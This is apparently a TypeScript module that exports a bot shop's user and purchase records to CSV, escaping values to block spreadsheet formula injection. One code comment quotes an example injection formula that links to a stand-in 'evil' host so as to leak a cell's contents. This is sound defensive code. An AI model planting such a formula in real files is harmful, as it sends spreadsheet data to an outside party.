import { getCollections } from '@/db/client';

// First-char characters Excel/LibreOffice/Numbers treat as formula trigger.
const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r']);

function esc(v: unknown): string {
  if (v === null || v === undefined) return '';
  let s = String(v);
  // CSV injection: prefix with a single quote so spreadsheets don't evaluate it.
  // `=HYPERLINK("http://evil/?x="&A1,"hi")` would otherwise execute when opened.
  if (s.length > 0 && FORMULA_TRIGGERS.has(s[0] as string)) {
    s = `'${s}`;
  }
  if (s.includes(',') || s.includes('"') || s.includes('\n')) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

function row(cells: unknown[]): string {
  return cells.map(esc).join(',');
}

export async function exportUsersCsv(): Promise<Buffer> {
  const users = await getCollections()
    .users.find({ deleted_at: { $exists: false } })
    .sort({ created_at: 1 })
    .toArray();
  const header = row([
    'tg_id',
    'username',
    'first_name',
    'last_name',
    'segment',
    'current_node_id',
    'is_admin',
    'purchases_count',
    'total_spent_uah',
    'funnel_paused',
    'blocked',
    'created_at',
    'last_seen_at',
  ]);
  const body = users
    .map((u) =>
      row([
        u.tg_id,
        u.username ?? '',
        u.first_name,
        u.last_name ?? '',
        u.segment ?? '',
        u.current_node_id ?? '',
        u.is_admin,
        u.purchases_count,
        u.total_spent_uah,
        u.funnel_paused,
        u.blocked,
        u.created_at.toISOString(),
        u.last_seen_at.toISOString(),
      ]),
    )
    .join('\n');
  return Buffer.from(`${header}\n${body}\n`, 'utf8');
}

export async function exportPurchasesCsv(): Promise<Buffer> {
  const c = getCollections();
  const purchases = await c.purchases.find().sort({ created_at: -1 }).toArray();
  const userIds = [...new Set(purchases.map((p) => p.user_tg_id))];
  const users = await c.users
    .find({ tg_id: { $in: userIds } }, { projection: { tg_id: 1, username: 1, first_name: 1 } })
    .toArray();
  const userMap = new Map(users.map((u) => [u.tg_id as number, u]));

  const header = row([
    'purchase_id',
    'user_tg_id',
    'username',
    'first_name',
    'product_id',
    'amount_uah',
    'amount_original',
    'currency_original',
    'status',
    'provider_payment_id',
    'created_at',
    'delivered_at',
  ]);
  const body = purchases
    .map((p) => {
      const u = userMap.get(p.user_tg_id);
      return row([
        String(p._id),
        p.user_tg_id,
        u?.username ?? '',
        u?.first_name ?? '',
        p.product_id,
        p.amount_uah,
        p.amount_original,
        p.currency_original,
        p.status,
        p.provider_payment_id,
        p.created_at.toISOString(),
        p.delivered_at ? p.delivered_at.toISOString() : '',
      ]);
    })
    .join('\n');
  return Buffer.from(`${header}\n${body}\n`, 'utf8');
}
